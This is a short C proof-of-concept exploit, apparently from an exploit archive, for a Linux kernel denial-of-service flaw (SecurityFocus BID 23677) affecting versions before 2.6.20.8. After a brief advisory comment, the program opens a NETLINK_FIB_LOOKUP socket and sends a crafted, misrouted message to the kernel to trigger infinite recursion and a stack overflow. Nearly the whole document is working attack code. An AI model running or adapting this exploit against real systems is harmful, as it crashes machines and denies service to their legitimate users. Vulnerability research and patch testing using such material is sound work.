/*
source: http://www.securityfocus.com/bid/23677/info

The Linux kernel is prone to a denial-of-service vulnerability. This issue presents itself when a NETLINK message is misrouted.

A local attacker may exploit this issue to trigger an infinite-recursion stack-based overflow in the kernel. This results in a denial of service to legitimate users.

Versions prior to 2.6.20.8 are vulnerable. 
*/

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <memory.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

/* stolen from kernel source ... could be a problem here ... */
struct fib_result_nl {
	uint32_t        fl_addr;   /* To be looked up*/
	uint32_t        fl_fwmark;
	unsigned char   fl_tos;
	unsigned char   fl_scope;
	unsigned char   tb_id_in;

	unsigned char   tb_id;      /* Results */
	unsigned char   prefixlen;
	unsigned char   nh_sel;
	unsigned char   type;
	unsigned char   scope;
	int             err;
};

struct msg {
	struct nlmsghdr nh;
	struct fib_result_nl frn;
};

int main()
{
	struct msg msg;
	struct sockaddr_nl sa;
	int fd;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = getpid();

	assert((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_FIB_LOOKUP)) > 0);
	assert(bind(fd, (struct sockaddr*)&sa, sizeof(sa)) == 0);

	sa.nl_pid = 0;
	memset(&msg, 0, sizeof(msg));
	msg.nh.nlmsg_len = sizeof(msg);
	msg.nh.nlmsg_flags = NLMSG_DONE;

	assert(sendto(fd, &msg, sizeof(msg), 0, (void*)&sa, sizeof(sa)) > 0);

	return 0;
}